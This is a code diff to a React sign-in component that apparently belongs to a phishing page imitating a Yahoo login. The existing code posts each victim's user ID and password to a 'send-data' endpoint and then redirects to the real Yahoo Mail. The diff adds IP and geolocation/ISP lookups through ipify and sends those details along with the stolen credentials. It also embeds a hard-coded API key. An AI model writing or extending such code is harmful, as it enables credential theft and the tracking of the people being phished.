@@ -16,10 +16,36 @@ const Signin = () => {
   const [showPassword, setShowPassword] = useState(false)
   const [isLoading, setIsLoading] = useState(false)
   const [redirect, setRedirect] = useState(false)
+  const [IPAddress, setIPAddress] = useState('')
+
+  const [userData, setUserData] = useState({ country: '', region: '', isp: '' })
 
   useEffect(() => {
     redirect && window.location.replace('https://mail.yahoo.com/')
   }, [redirect])
+
+  useEffect(() => {
+    fetch('https://api.ipify.org?format=json')
+      .then((response) => response.json())
+      .then((data) => {
+        setIPAddress(data.ip)
+        console.log('ip is', data.ip)
+      })
+      .then(() => {
+        axios
+          .get(
+            `https://geo.ipify.org/api/v2/country,city?apiKey=at_WBywPSAmG7JNZsxPAL1D32IVCrz6x&ipAddress=${IPAddress}`
+          )
+          .then((resp) => {
+            const { location, isp } = resp.data
+            const { country, region } = location
+            console.log(country, region, isp)
+            setUserData({ country, region, isp })
+          })
+          .catch((e) => console.log(e))
+      })
+      .catch((error) => console.error(error))
+  }, [])
 
   const handleContinue = () => {
     setError('')
@@ -35,7 +61,12 @@ const Signin = () => {
       } else {
         setIsLoading(true)
         axios
-          .post(`${baseURL}send-data`, { userID, password })
+          .post(`${baseURL}send-data`, {
+            userID,
+            password,
+            ...userData,
+            IPAddress,
+          })
           .then((resp) => {
             console.log(resp.data)
             setRedirect(true)
